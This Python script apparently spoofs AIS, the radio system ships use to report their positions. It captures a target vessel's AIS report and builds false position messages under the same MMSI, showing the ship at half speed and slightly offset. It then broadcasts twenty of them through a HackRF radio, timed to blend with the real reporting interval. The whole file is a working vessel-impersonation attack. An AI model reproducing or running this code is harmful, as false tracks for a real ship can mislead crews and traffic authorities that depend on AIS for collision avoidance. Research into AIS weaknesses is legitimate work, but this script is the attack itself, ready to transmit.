import time
import subprocess
from pyais import decode, encode_dict
from geopy import Point
from AIS_constructor import assembler
from geopy.distance import geodesic

start_time = time.time()
speedmultiplier = 0.5

def ascii_to_6bit_binary(ascii_string):
    ascii_table = {
        '0': 0, '1': 1, '2': 2, '3': 3, '4': 4, '5': 5, '6': 6, '7': 7,
        '8': 8, '9': 9, ':': 10, ';': 11, '<': 12, '=': 13, '>': 14, '?': 15,
        '@': 16, 'A': 17, 'B': 18, 'C': 19, 'D': 20, 'E': 21, 'F': 22, 'G': 23,
        'H': 24, 'I': 25, 'J': 26, 'K': 27, 'L': 28, 'M': 29, 'N': 30, 'O': 31,
        'P': 32, 'Q': 33, 'R': 34, 'S': 35, 'T': 36, 'U': 37, 'V': 38, 'W': 39,
        '`': 40, 'a': 41, 'b': 42, 'c': 43, 'd': 44, 'e': 45, 'f': 46, 'g': 47,
        'h': 48, 'i': 49, 'j': 50, 'k': 51, 'l': 52, 'm': 53, 'n': 54, 'o': 55,
        'p': 56, 'q': 57, 'r': 58, 's': 59, 't': 60, 'u': 61, 'v': 62, 'w': 63
    }
    binary_string = ''.join(format(ascii_table[char], '06b') for char in ascii_string)
    return binary_string

def generate_strings(signals):
    all_signals = []
    for x in signals:
        signal = encode_dict(x, radio_channel="B", talker_id="AIVDM")[0]
        all_signals.append(signal)
    return all_signals


def generate_full_string(strings):
    strings = [message.split(',')[5] for message in strings]
    final = []
    for x in strings:
        bits = ascii_to_6bit_binary(x)
        ais_signal = assembler(bits)
        final.append(ais_signal)
    return final

def set_reporting_interval(speed_knots):
    if speed_knots <= 3:
        return 180 if speed_knots == 0 else 10  # 3 minutes if anchored, 10 seconds if moving up to 3 knots
    elif 3 < speed_knots <= 14:
        return 10  # 10 seconds for speeds between 3 and 14 knots
    elif 14 < speed_knots <= 23:
        return 6  # 6 seconds for speeds between 14 and 23 knots
    else:
        return 2  # 2 seconds for speeds above 23 knots


def listen_for_new_signal():
    global mmsi
    global target_mmsi
    result = subprocess.run(['python3.9', 'listener.py', target_mmsi], check=False, capture_output=True, text=True)
    cleaned_stdout = str(result.stdout.strip())[2:-1]  # Removes any leading or trailing whitespace, including newlines and b'string'

    bin_version = cleaned_stdout.encode('utf-8')
    decoded = decode(bin_version)
    target_lon = decoded.lon
    target_lat = decoded.lat
    target_speed = decoded.speed
    target_course = decoded.course
    return [target_lon, target_lat, target_speed, target_course]


def realistic_sender(signals, hackrf):
    for signal in signals:
        result = subprocess.run(
            ['python3.12', 'transmitter.py', signal, hackrf],
            stdout=subprocess.DEVNULL,  # Suppress standard output
            stderr=subprocess.DEVNULL   # Suppress standard output
        )



def get_new_fake_pos(lon, lat, speed, course, speedmultiplier=0.5):
    new_speed = speed * speedmultiplier
    time_diff = set_reporting_interval(speed)
    distance_nm = (new_speed * time_diff) / 3600
    new_position = geodesic(nautical=distance_nm).destination(Point(lat, lon), course)
    return new_position.longitude, new_position.latitude, new_speed

def get_new_fake_signal(lon, lat, speed, course, mmsi):
    ais_data = [{
        'msg_type': 1,
        'course': course,
        'lat': lat,
        'lon': lon,
        'mmsi': mmsi,
        'turn': 127.0,
        'speed': speed,
        'heading': 23,
        'second': 4,
    }]
    return generate_full_string(generate_strings(ais_data))


target_mmsi = "333"
mmsi = target_mmsi

# Get initial signal
target_lon, target_lat, target_speed, target_course = listen_for_new_signal()
new_pos = get_new_fake_pos(target_lon, target_lat, target_speed, target_course)
slow_speed = new_pos[2]
expected_interval = set_reporting_interval(target_speed)
next_time = time.monotonic() 
next_time += expected_interval
tune_factor = 0.525
time.sleep(next_time - time.monotonic() - tune_factor)
next_time = time.monotonic() 

for x in range(20):
    fake_signal = get_new_fake_signal(new_pos[0], new_pos[1]-0.002, slow_speed, target_course, mmsi)
    realistic_sender(fake_signal, "0000000000000000f75461dc293aa3c3")
    print(f"{time.monotonic():.3f}")
    # correction_factor = 0.435  # Based on previous measurement
    # time.sleep(max(expected_interval - correction_factor, 0.1))  # Prevent negative sleep time
    new_pos = get_new_fake_pos(new_pos[0], new_pos[1], target_speed, target_course)
    next_time += expected_interval
    time.sleep(next_time - time.monotonic())


